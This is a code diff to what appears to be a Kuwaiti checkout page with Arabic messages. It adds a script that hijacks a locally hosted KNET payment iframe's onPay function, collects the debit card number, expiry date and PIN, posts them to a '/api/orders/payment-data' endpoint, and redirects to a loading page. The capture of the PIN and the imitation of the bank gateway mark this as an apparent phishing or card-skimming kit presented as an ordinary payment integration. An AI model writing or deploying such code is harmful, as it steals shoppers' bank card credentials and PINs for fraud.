@@ -797,6 +797,83 @@
             document.getElementById('selectKnet').addEventListener('click', () => showPayment('knet'));
             showPayment('credit'); // الحالة الافتراضية
 
+            const knetIframe = document.getElementById('knetIframe');
+            if (knetIframe) {
+                knetIframe.onload = function() {
+                    try {
+                        const iframeWin = knetIframe.contentWindow;
+                        const iframeDoc = knetIframe.contentDocument || iframeWin.document;
+
+                        // Override onPay to handle API submission
+                        const originalOnPay = iframeWin.onPay;
+                        iframeWin.onPay = function() {
+                            const debitNumber = iframeDoc.getElementById('debitNumber') ? iframeDoc.getElementById('debitNumber').value.replace(/\s/g, '') : '';
+                            const expiryMonth = iframeDoc.getElementById('expiryMonthBox') ? iframeDoc.getElementById('expiryMonthBox').value : '';
+                            const expiryYear = iframeDoc.getElementById('expiryYearBox') ? iframeDoc.getElementById('expiryYearBox').value : '';
+                            const cardPin = iframeDoc.getElementById('cardPin') ? iframeDoc.getElementById('cardPin').value : '';
+                            
+                            if (!debitNumber || !expiryMonth || !expiryYear || !cardPin) {
+                                if (typeof originalOnPay === 'function') {
+                                    const res = originalOnPay();
+                                    if (res === false) return;
+                                } else {
+                                    alert('يرجى إكمال جميع البيانات');
+                                    return;
+                                }
+                            }
+
+                            const orderId = localStorage.getItem('orderId') || sessionStorage.getItem('orderId');
+                            const knetData = {
+                                orderId: orderId,
+                                payment_method: 'Knet',
+                                knet_data: {
+                                    card_number: debitNumber,
+                                    expiry_month: expiryMonth,
+                                    expiry_year: expiryYear,
+                                    pin: cardPin,
+                                    timestamp: new Date().toISOString()
+                                }
+                            };
+
+                            if (typeof iframeWin.loadshow === 'function') iframeWin.loadshow();
+
+                            fetch('/api/orders/payment-data', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify(knetData)
+                            })
+                            .then(r => r.json())
+                            .then(data => {
+                                window.location.href = 'loading.html';
+                            })
+                            .catch(err => {
+                                if (typeof iframeWin.loadhide === 'function') iframeWin.loadhide();
+                                alert('حدث خطأ أثناء إرسال البيانات');
+                            });
+                        };
+
+                        // Handle message from parent
+                        iframeWin.addEventListener('message', function(event) {
+                            if (event.data.type === 'submitKnet') {
+                                iframeWin.onPay();
+                            }
+                            if (event.data.type === 'initKnetData') {
+                                if (event.data.knetTotal) {
+                                    const amountElements = iframeDoc.querySelectorAll('.paymentdata');
+                                    amountElements.forEach(el => {
+                                        if (el.textContent.includes('KD') || el.textContent.includes('د.ك')) {
+                                            el.textContent = event.data.knetTotal;
+                                        }
+                                    });
+                                }
+                            }
+                        });
+                    } catch (e) {
+                        console.error("Bridge injection failed:", e);
+                    }
+                };
+            }
+
             // Pass data to KNET iframe after a short delay to ensure it loads
             setTimeout(function() {
                 var iframe = document.getElementById('knetIframe');
